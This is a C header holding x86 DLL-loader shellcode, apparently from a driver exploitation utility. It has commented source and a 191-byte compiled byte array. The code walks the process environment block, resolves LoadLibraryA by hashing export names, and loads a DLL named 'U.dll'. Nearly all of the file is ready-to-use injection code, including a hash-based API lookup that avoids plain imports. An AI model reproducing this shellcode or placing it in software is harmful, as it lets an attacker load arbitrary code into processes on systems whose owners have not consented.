/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       LDRSC.H
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Dll loader shellcode.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

/*
ldrsc.cpp
 
#ifdef _WIN64
#error Compile shell as x86 only
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>
#include <intrin.h>
#include "ntos.h"

typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);

PVOID NTAPI RawGetProcAddress(PVOID Module, DWORD FuncHash);
DWORD NTAPI ComputeHash(char* s);

VOID NTAPI main()
{
    PPEB Peb = NtCurrentPeb();
    ULONG c;
    pfnLoadLibraryA xLoadLibraryA;
    CHAR szDll[] = { 'U', '.', 'd', 'l', 'l', 0 };

    PLDR_DATA_TABLE_ENTRY Entry =
        (PLDR_DATA_TABLE_ENTRY)Peb->Ldr->InLoadOrderModuleList.Flink;

    for (c = 0; c < 2; c++)
        Entry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;

    xLoadLibraryA = (pfnLoadLibraryA)RawGetProcAddress(Entry->DllBase, 0x69b37e08);
    if (xLoadLibraryA) {
        xLoadLibraryA(szDll);
    }

}

DWORD NTAPI ComputeHash(char* s)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

PVOID NTAPI RawGetProcAddress(PVOID Module, DWORD FuncHash)
{
    PIMAGE_DOS_HEADER           dosh = (PIMAGE_DOS_HEADER)Module;
    PIMAGE_FILE_HEADER          fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
    PIMAGE_OPTIONAL_HEADER      popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
    DWORD                       ETableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY     pexp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosh + ETableVA);
    PDWORD                      names = (PDWORD)((PBYTE)dosh + pexp->AddressOfNames), functions = (PDWORD)((PBYTE)dosh + pexp->AddressOfFunctions);
    PWORD                       ordinals = (PWORD)((PBYTE)dosh + pexp->AddressOfNameOrdinals);
    DWORD_PTR                   c, fp;
    PVOID                       fnptr = NULL;

    for (c = 0; c < pexp->NumberOfNames; c++) {
        if (ComputeHash((char*)((PBYTE)dosh + names[c])) == FuncHash) {
            fp = functions[ordinals[c]];
            fnptr = (PBYTE)Module + fp;
            break;
        }
    }

    return fnptr;
}
*/

static unsigned char g_KduLoaderShellcode[191] = {
    0x55, 0x8B, 0xEC, 0x51, 0x51, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x8B, 0x40, 0x30,
    0xC7, 0x45, 0xF8, 0x55, 0x2E, 0x64, 0x6C, 0x66, 0xC7, 0x45, 0xFC, 0x6C, 0x00, 0x8B, 0x40, 0x0C,
    0x8B, 0x48, 0x0C, 0x58, 0x8B, 0x09, 0x83, 0xE8, 0x01, 0x75, 0xF9, 0x8B, 0x49, 0x18, 0xE8, 0x0C,
    0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x06, 0x8D, 0x4D, 0xF8, 0x51, 0xFF, 0xD0, 0xC9, 0xC3, 0x55,
    0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x53, 0x57, 0x8B, 0xF9, 0x8B, 0x47, 0x3C, 0x8B, 0x44, 0x38, 0x78,
    0x03, 0xC7, 0x8B, 0x48, 0x1C, 0x8B, 0x58, 0x20, 0x03, 0xCF, 0x89, 0x4D, 0xF0, 0x03, 0xDF, 0x8B,
    0x48, 0x24, 0x8B, 0x40, 0x18, 0x03, 0xCF, 0x89, 0x4D, 0xF4, 0x33, 0xC9, 0x89, 0x5D, 0xF8, 0x8B,
    0xD1, 0x89, 0x45, 0xFC, 0x85, 0xC0, 0x74, 0x41, 0x56, 0x8B, 0x34, 0x93, 0x8B, 0xD9, 0x03, 0xF7,
    0x8A, 0x06, 0x84, 0xC0, 0x74, 0x18, 0x0F, 0xBE, 0xC0, 0x33, 0xD8, 0xC1, 0xC3, 0x03, 0x43, 0x46,
    0x8A, 0x06, 0x84, 0xC0, 0x75, 0xF0, 0x81, 0xFB, 0x08, 0x7E, 0xB3, 0x69, 0x74, 0x0B, 0x42, 0x3B,
    0x55, 0xFC, 0x73, 0x14, 0x8B, 0x5D, 0xF8, 0xEB, 0xD0, 0x8B, 0x45, 0xF4, 0x8B, 0x4D, 0xF0, 0x0F,
    0xB7, 0x04, 0x50, 0x8B, 0x0C, 0x81, 0x03, 0xCF, 0x5E, 0x5F, 0x8B, 0xC1, 0x5B, 0xC9, 0xC3
};
